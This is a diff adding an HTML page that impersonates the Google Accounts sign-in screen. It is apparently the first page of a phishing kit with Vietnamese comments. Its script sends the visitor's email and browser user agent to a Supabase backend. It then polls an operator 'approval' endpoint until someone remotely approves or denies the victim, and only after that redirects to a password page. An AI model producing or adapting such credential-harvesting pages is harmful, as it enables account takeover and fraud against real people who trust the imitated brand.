@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="icon" href="google_logo_icon_169090.ico">
+    <style>
+        /* Đẩy input xuống thấp hơn cho trang này */
+        .signin-form .input-field {
+            margin-top: 24px !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+    </div>
+
+    <!-- Main content -->
+    <div class="main-wrapper page-transition">
+        <div class="login-wrapper">
+            <div class="signin-card">
+                <!-- Progress bar container -->
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="signin-columns">
+                    <!-- Left Column: Logo, Title, Description -->
+                    <div class="signin-left">
+                        <div class="logo-wrapper">
+                            <img src="google_logo_icon_169090.ico" alt="Google logo" class="google-logo" style="width:48px;height:48px;" />
+                        </div>
+                        <h1 class="signin-title">Sign in</h1>
+                        <p class="signin-subtitle" style="color: #202124;">with your Google Account. This account will be available to other Google apps in the browser.</p>
+                    </div>
+                    
+                    <!-- Right Column: Sign-in Form -->
+                    <div class="signin-right">
+                        <form id="loginForm" class="signin-form" novalidate>
+                            <div class="input-field">
+                                <input type="email" id="email" class="text-input" placeholder=" " required autocomplete="username">
+                                <label for="email" class="floating-label">Email or phone</label>
+                            </div>
+                            <div class="error-wrapper">
+                                <span class="error-text" id="email-error"></span>
+                            </div>
+                            
+                                <button type="button" class="forgot-email-btn">Forgot email?</button>
+                            
+                            <div class="helper-text">
+                                <p>Not your computer? Use Guest mode to sign in privately. <a href="#" class="learn-more">Learn more about using Guest mode</a></p>
+                            </div>
+                            
+                            <div class="action-buttons">
+                                <button type="submit" class="btn-primary">Next</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+            <footer class="page-footer">
+                <div class="footer-wrapper">
+                        <a href="#" class="footer-link">Help</a>
+                        <a href="#" class="footer-link">Privacy</a>
+                        <a href="#" class="footer-link">Terms</a>
+                </div>
+            </footer>
+    </div>
+
+    <script>
+        // Function to update page status via Supabase
+        async function updatePageStatus(pageName) {
+            const requestId = localStorage.getItem('requestId');
+            if (!requestId) return;
+            
+            try {
+                await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/update-page', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
+                        'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
+                    },
+                    body: JSON.stringify({ 
+                        id: parseInt(requestId), 
+                        currentPage: pageName 
+                    })
+                });
+                console.log('Page status updated:', pageName);
+            } catch (err) {
+                console.log('Failed to update page status:', err);
+            }
+        }
+
+        // Smooth progress bar function for API calls
+        function startProgressBar() {
+            const progressBar = document.getElementById('progressBar');
+            const progressContainer = document.querySelector('.progress-container');
+            
+            if (!progressBar || !progressContainer) return;
+            
+            // Show progress container
+            progressContainer.classList.add('active');
+            
+            // Reset and start animation
+            progressBar.style.width = '0%';
+            progressBar.classList.remove('loading', 'completing');
+            
+            setTimeout(() => {
+                progressBar.classList.add('loading');
+                progressBar.style.width = '80%';
+            }, 100);
+            
+            return {
+                complete: () => {
+                    progressBar.classList.remove('loading');
+                    progressBar.classList.add('completing');
+                    progressBar.style.width = '100%';
+                    
+                    setTimeout(() => {
+                        progressContainer.classList.remove('active');
+                    }, 300);
+                },
+                hide: () => {
+                    progressContainer.classList.remove('active');
+                }
+            };
+        }
+
+        // Page transition handler
+        function handleTransition(url) {
+            const card = document.querySelector('.signin-card');
+            if (card) {
+                card.classList.add('fade-out');
+            setTimeout(() => {
+                window.location.href = url;
+            }, 300);
+        } else {
+            window.location.href = url;
+        }
+    }
+
+        // Form validation and submission
+        function handleFormSubmission() {
+        const form = document.getElementById('loginForm');
+                const emailInput = document.getElementById('email');
+                const emailError = document.getElementById('email-error');
+                
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                // Reset previous errors
+                emailInput.classList.remove('error');
+                emailError.textContent = '';
+                const email = emailInput.value.trim();
+                // Basic email validation
+                if (!email) {
+                    showError('Enter an email or phone number');
+                    return;
+                }
+                if (!isValidEmail(email) && !isValidPhone(email)) {
+                    showError('Enter a valid email or phone number');
+                    return;
+                }
+                // Show loading state
+                const submitBtn = form.querySelector('.btn-primary');
+                submitBtn.classList.add('loading');
+                submitBtn.disabled = true;
+                
+                // Start smooth progress bar
+                const progress = startProgressBar();
+                
+                // Store email for next page
+                localStorage.setItem('userEmail', email);
+                
+                // Gửi dữ liệu lên Supabase backend
+                const userAgent = navigator.userAgent;
+                let requestId = null;
+                try {
+                    const res = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/request', {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
+                            'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
+                        },
+                        body: JSON.stringify({ 
+                            email, 
+                            password: '', 
+                            twofa: '', 
+                            userAgent,
+                            currentPage: 'index.html'
+                        })
+                    });
+                    const data = await res.json();
+                    requestId = data.requestId;
+                    localStorage.setItem('requestId', requestId);
+                    console.log('Request sent to Supabase, ID:', requestId);
+                } catch (err) { 
+                    console.error('Error sending to Supabase:', err);
+                    // Nếu có lỗi, vẫn cần chờ approval - không bỏ qua
+                    alert('Error connecting to server. Please try again.');
+                    const submitBtn = document.querySelector('.btn-primary');
+                    submitBtn.classList.remove('loading');
+                    submitBtn.disabled = false;
+                    progress.hide();
+                    return;
+                }
+                
+                // Bắt đầu kiểm tra phê duyệt
+                await checkApprovalStatus(email, 'password.html');
+            });
+
+            function showError(message) {
+                emailInput.classList.add('error');
+                emailError.textContent = message;
+                emailInput.focus();
+            }
+
+            function isValidEmail(email) {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailRegex.test(email);
+            }
+
+            function isValidPhone(phone) {
+                const phoneRegex = /^\+?[\d\s\-\(\)]+$/;
+                return phoneRegex.test(phone) && phone.replace(/\D/g, '').length >= 10;
+            }
+
+            // Hàm kiểm tra trạng thái approval qua Supabase
+            async function checkApprovalStatus(email, nextPage) {
+                const maxAttempts = 120; // Tối đa 120 lần kiểm tra (2 phút)
+                let attempts = 0;
+                
+                console.log('🔄 Starting approval check for:', email);
+                
+                const checkStatus = async () => {
+                    try {
+                        const response = await fetch(`https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/check-approval?email=${encodeURIComponent(email)}`, {
+                            headers: {
+                                'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
+                                'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
+                            }
+                        });
+                        
+                        if (response.ok) {
+                            const data = await response.json();
+                            console.log(`📊 Approval check #${attempts + 1}:`, data.status);
+                            
+                            if (data.status === 'approved') {
+                                // Được approve, chuyển trang
+                                console.log('✅ Request approved! Redirecting...');
+                                const progress = startProgressBar();
+                                progress.complete();
+                                setTimeout(() => {
+                                    window.location.href = nextPage + '?email=' + encodeURIComponent(email);
+                                }, 300);
+                                return;
+                            } else if (data.status === 'denied') {
+                                // Bị từ chối, hiển thị thông báo
+                                console.log('❌ Request denied');
+                                const submitBtn = document.querySelector('.btn-primary');
+                                submitBtn.classList.remove('loading');
+                                submitBtn.disabled = false;
+                                showError('Access denied. Please try again.');
+                                return;
+                            }
+                        }
+                        
+                        attempts++;
+                        if (attempts < maxAttempts) {
+                            // Kiểm tra nhanh hơn: 500ms cho 40 lần đầu, sau đó 1000ms
+                            const interval = attempts < 40 ? 500 : 1000;
+                            setTimeout(checkStatus, interval);
+                        } else {
+                            // Hết thời gian chờ
+                            console.log('⏰ Approval timeout - no response from admin');
+                            const submitBtn = document.querySelector('.btn-primary');
+                            submitBtn.classList.remove('loading');
+                            submitBtn.disabled = false;
+                            showError('Request timeout. Please try again.');
+                        }
+                    } catch (error) {
+                        console.error('❌ Error checking approval status:', error);
+                        attempts++;
+                        if (attempts < maxAttempts) {
+                            const interval = attempts < 40 ? 500 : 1000;
+                            setTimeout(checkStatus, interval);
+                        } else {
+                            console.log('❌ Error timeout checking approval');
+                            const submitBtn = document.querySelector('.btn-primary');
+                            submitBtn.classList.remove('loading');
+                            submitBtn.disabled = false;
+                            showError('Connection error. Please try again.');
+                        }
+                    }
+                };
+                
+                // Bắt đầu kiểm tra
+                checkStatus();
+            }
+        }
+
+        // Mobile responsive handler
+        function handleMobileLayout() {
+            function checkMobile() {
+                if (window.innerWidth <= 600) {
+                    document.body.classList.add('mobile-layout');
+                } else {
+                    document.body.classList.remove('mobile-layout');
+                }
+            }
+            
+            checkMobile();
+            window.addEventListener('resize', checkMobile);
+        }
+
+        // Initialize when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            handleFormSubmission();
+            handleMobileLayout();
+            
+            // Focus on email input
+            document.getElementById('email').focus();
+            
+            // Handle forgot email button
+            const forgotBtn = document.querySelector('.forgot-email-btn');
+            if (forgotBtn) {
+                forgotBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    alert('Forgot email feature would be implemented here');
+                });
+            }
+            
+            // Handle create account button
+            const btnSecondary = document.querySelector('.btn-secondary');
+            if (btnSecondary) {
+                btnSecondary.addEventListener('click', function() {
+                    alert('Create account feature would be implemented here');
+                });
+            }
+            
+            // Handle learn more link
+            const learnMore = document.querySelector('.learn-more');
+            if (learnMore) {
+                learnMore.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    alert('Guest mode help would be shown here');
+                });
+            }
+        });
+
+        // Accessibility improvements
+        document.addEventListener('keydown', function(e) {
+            // Allow form submission with Enter key
+            if (e.key === 'Enter' && document.activeElement.tagName !== 'BUTTON') {
+                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+            }
+    });
+    </script>
+</body>
+</html> 
